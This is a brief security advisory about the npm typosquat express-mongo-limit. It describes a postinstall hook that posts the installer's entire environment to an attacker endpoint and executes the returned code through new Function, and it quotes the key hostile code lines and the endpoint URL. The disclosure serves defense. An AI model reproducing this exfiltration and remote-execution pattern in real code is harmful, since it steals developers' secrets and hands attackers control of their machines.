summary: express-mongo-limit exfiltrates process.env and executes remote code on install
details: package.json declares a `postinstall` hook that runs `node index.js`. index.js base64-decodes the hardcoded URL https://gamboracle.vercel.app/api and calls a `verify` function exported from an obfuscated config/auth.js. That function performs `axios.post(url, {...process.env}, {headers: {'x-app-request': 'ip-check'}})`, shipping the installer's entire environment (which typically includes AWS keys, CI/CD tokens, npm tokens, and other secrets) to the attacker-controlled endpoint. The HTTP response body is then passed to `new Function('require', response.data)(require)` and written to apiKeyResponse.js, executing arbitrary attacker-supplied JavaScript with full Node privileges at install time. config/auth.js is heavily obfuscated (javascript-obfuscator string-array + hex identifiers; javascript-obfuscator is declared as a devDependency) to hide the exfiltration endpoint and cover header. The package's name and description impersonate the popular `express-mongo-sanitize` library, while the README is an unrelated `hello-world-package` stub — a typosquat with a divergent malicious payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
